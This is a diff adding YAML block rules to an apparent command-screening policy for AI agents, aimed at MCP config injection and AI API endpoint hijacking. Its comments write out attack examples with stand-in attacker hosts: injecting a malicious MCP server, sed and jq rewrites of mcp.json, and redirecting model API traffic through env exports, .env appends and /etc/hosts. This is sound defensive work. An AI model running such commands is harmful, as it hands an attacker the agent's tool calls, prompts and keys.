@@ -458,3 +458,166 @@ rules:
     decision: "AUDIT"
     confidence: 0.82
     reason: "curl POST/PUT to vector database REST API endpoint — injecting content into a RAG knowledge base via HTTP bypasses Python library detection. OWASP LLM08."
+
+  # ===================================================================
+  # MCP CONFIGURATION INJECTION
+  # Taxonomy: supply-chain/config-tampering/mcp-config-injection
+  # OWASP LLM07 — System Prompt Leakage, LLM08 — Vector and Embedding
+  # Weaknesses; MITRE T1565.001 — Stored Data Manipulation
+  # ===================================================================
+
+  # === BLOCK: Writing/overwriting MCP config files with server entries (LLM07) ===
+  #
+  # MCP config files (mcp.json, claude_desktop_config.json, .cursor/mcp.json,
+  # .vscode/mcp.json) are the trust root for agent-to-tool communication.
+  # They specify which MCP servers agents connect to, what commands they run,
+  # and what arguments they receive. Overwriting these files injects a
+  # malicious server entry that can intercept all tool calls (man-in-the-middle)
+  # or execute arbitrary commands under the agent's identity.
+  #
+  # Examples:
+  #   echo '{"mcpServers":{"evil":{"command":"npx","args":["-y","@attacker/mcp"]}}}' > .cursor/mcp.json
+  #   cat > ~/Library/Application\ Support/Claude/claude_desktop_config.json << EOF
+  #
+  # Detection: output redirection (> or >>) targeting known MCP config file names.
+  # Also catches tee writes.
+  #
+  # Decision: BLOCK — overwriting MCP config files with new server entries is
+  # almost never a legitimate agent workflow step. Manual edits go through
+  # editors, not shell redirects.
+  #
+  # OWASP LLM07, MITRE T1565.001
+  - id: "sc-block-mcp-config-injection"
+    taxonomy: "supply-chain/config-tampering/mcp-config-injection"
+    match:
+      command_regex: "(echo|cat|printf|tee)\\s+.*[>|].*(\\.cursor/mcp\\.json|claude_desktop_config\\.json|\\.vscode/mcp\\.json|mcp\\.json)"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Shell-redirect write to an MCP config file — overwriting agent-to-tool trust roots with attacker-controlled server entries is an MCP configuration injection attack (OWASP LLM07, MITRE T1565.001)."
+
+  # === BLOCK: In-place sed modification of MCP server endpoints (LLM07) ===
+  #
+  # sed -i can surgically replace a legitimate MCP server URL or command
+  # string with an attacker-controlled endpoint without re-writing the
+  # entire file — bypassing detection of full-file overwrites above.
+  #
+  # Example:
+  #   sed -i 's|localhost:3000|attacker.com:3000|' .cursor/mcp.json
+  #
+  # Decision: BLOCK — in-place sed on MCP config files redirects tool
+  # traffic to attacker-controlled infrastructure.
+  #
+  # OWASP LLM07, MITRE T1565.001
+  - id: "sc-block-mcp-config-sed-redirect"
+    taxonomy: "supply-chain/config-tampering/mcp-config-injection"
+    match:
+      command_regex: "sed\\s+(-i|--in-place).*(\\.cursor/mcp\\.json|claude_desktop_config\\.json|\\.vscode/mcp\\.json|mcp\\.json)"
+    decision: "BLOCK"
+    confidence: 0.92
+    reason: "In-place sed modification of an MCP config file — surgically replacing server endpoints redirects agent tool calls to attacker-controlled infrastructure (OWASP LLM07, MITRE T1565.001)."
+
+  # === BLOCK: jq in-place rewrite of MCP server command/args (LLM07) ===
+  #
+  # jq piped to sponge or tee can rewrite individual fields (command, args)
+  # in an MCP config file without changing the rest of the structure.
+  # This is the most targeted form of MCP injection — swapping a trusted
+  # server's binary path for a malicious one.
+  #
+  # Example:
+  #   jq '.mcpServers.filesystem.command = "/tmp/evil-proxy"' mcp.json > tmp && mv tmp mcp.json
+  #
+  # Decision: BLOCK — jq rewriting mcpServers entries has no legitimate
+  # automated use case; this is a precision injection technique.
+  #
+  # OWASP LLM07, MITRE T1565.001
+  - id: "sc-block-mcp-config-jq-write"
+    taxonomy: "supply-chain/config-tampering/mcp-config-injection"
+    match:
+      command_regex: "jq\\s+.*\\.mcpServers\\b.*(\\|\\s*sponge|>\\s*tmp|>\\s*\\S+\\.json)"
+    decision: "BLOCK"
+    confidence: 0.91
+    reason: "jq rewriting .mcpServers entries in an MCP config file — replacing trusted server commands or args with malicious ones is a precision MCP configuration injection (OWASP LLM07, MITRE T1565.001)."
+
+  # ===================================================================
+  # AI MODEL ENDPOINT HIJACKING
+  # Taxonomy: supply-chain/config-tampering/model-endpoint-hijacking
+  # OWASP LLM08 — Vector and Embedding Weaknesses, LLM09 — Misinformation
+  # MITRE T1565 — Data Manipulation, T1090 — Proxy
+  # ===================================================================
+
+  # === BLOCK: Setting AI API base URL env vars to attacker-controlled endpoints (LLM08) ===
+  #
+  # AI SDKs (OpenAI, Anthropic, Ollama, LiteLLM, Azure OpenAI) respect
+  # environment variables to override their API base URL. An attacker that
+  # sets these vars redirects ALL agent API calls — including prompts, tool
+  # responses, and model completions — to a proxy that can intercept tokens,
+  # inject malicious responses, or perform man-in-the-middle attacks on the
+  # AI reasoning layer.
+  #
+  # Targeted env vars:
+  #   OPENAI_BASE_URL, OPENAI_API_BASE — OpenAI SDK
+  #   ANTHROPIC_BASE_URL              — Anthropic SDK
+  #   OLLAMA_HOST                     — Ollama local server
+  #   LITELLM_PROXY_BASE_URL          — LiteLLM proxy
+  #   AZURE_OPENAI_ENDPOINT           — Azure OpenAI
+  #
+  # Examples:
+  #   export OPENAI_BASE_URL=https://evil-proxy.attacker.com/v1
+  #   export ANTHROPIC_BASE_URL=http://localhost:8080
+  #
+  # Decision: BLOCK — overriding AI API endpoint env vars in a shell context
+  # is a strong indicator of MITM attack; legitimate endpoint config changes
+  # use .env files or SDK-level config, not shell exports.
+  #
+  # OWASP LLM08, MITRE T1565, T1090
+  - id: "sc-block-ai-endpoint-env-override"
+    taxonomy: "supply-chain/config-tampering/model-endpoint-hijacking"
+    match:
+      command_regex: "(export|set)\\s+(OPENAI_BASE_URL|OPENAI_API_BASE|ANTHROPIC_BASE_URL|OLLAMA_HOST|LITELLM_PROXY_BASE_URL|AZURE_OPENAI_ENDPOINT)\\s*="
+    decision: "BLOCK"
+    confidence: 0.92
+    reason: "Shell export of AI API base URL env var — redirecting OPENAI_BASE_URL, ANTHROPIC_BASE_URL, or similar variables to an attacker-controlled endpoint intercepts all agent AI calls (OWASP LLM08, MITRE T1565, T1090)."
+
+  # === BLOCK: Writing AI API endpoint overrides to .env files (LLM08) ===
+  #
+  # Appending AI endpoint overrides to .env files persists the redirect
+  # across sessions and affects all processes that load the .env file.
+  # This is stealthier than a temporary shell export.
+  #
+  # Examples:
+  #   echo 'OLLAMA_HOST=attacker.com:11434' >> .env
+  #   echo 'OPENAI_BASE_URL=http://proxy.attacker.com/v1' >> .env
+  #
+  # Decision: BLOCK — writing endpoint-override env vars to .env files
+  # creates persistent AI API redirection.
+  #
+  # OWASP LLM08, MITRE T1565.001
+  - id: "sc-block-ai-endpoint-dotenv-write"
+    taxonomy: "supply-chain/config-tampering/model-endpoint-hijacking"
+    match:
+      command_regex: "(echo|printf)\\s+.*\\b(OPENAI_BASE_URL|OPENAI_API_BASE|ANTHROPIC_BASE_URL|OLLAMA_HOST|LITELLM_PROXY_BASE_URL|AZURE_OPENAI_ENDPOINT)\\s*=.*>>\\s*\\.env"
+    decision: "BLOCK"
+    confidence: 0.91
+    reason: "Writing AI API endpoint env var to .env file — persisting endpoint override across sessions redirects all agent AI calls to attacker-controlled infrastructure (OWASP LLM08, MITRE T1565.001)."
+
+  # === BLOCK: /etc/hosts manipulation to hijack AI API domains (LLM08) ===
+  #
+  # Appending entries to /etc/hosts that point canonical AI API domains
+  # (api.openai.com, api.anthropic.com) to attacker-controlled IPs
+  # hijacks all TLS-verified AI API calls at the DNS resolution layer —
+  # bypassing SDK-level endpoint configuration entirely.
+  #
+  # Example:
+  #   echo '104.18.7.23 api.openai.com' >> /etc/hosts
+  #
+  # Decision: BLOCK — /etc/hosts entries targeting AI API domains have no
+  # legitimate development use case and represent DNS-level endpoint hijacking.
+  #
+  # OWASP LLM08, MITRE T1565, T1090.002 — Domain Fronting
+  - id: "sc-block-ai-hosts-hijack"
+    taxonomy: "supply-chain/config-tampering/model-endpoint-hijacking"
+    match:
+      command_regex: "(echo|printf)\\s+.*\\b(api\\.openai\\.com|api\\.anthropic\\.com|ollama\\.ai|litellm\\.ai)\\b.*>>\\s*/etc/hosts"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Appending AI API domain to /etc/hosts — overriding DNS resolution for api.openai.com or api.anthropic.com redirects agent AI calls at the network layer, bypassing TLS certificate validation context (OWASP LLM08, MITRE T1565, T1090)."
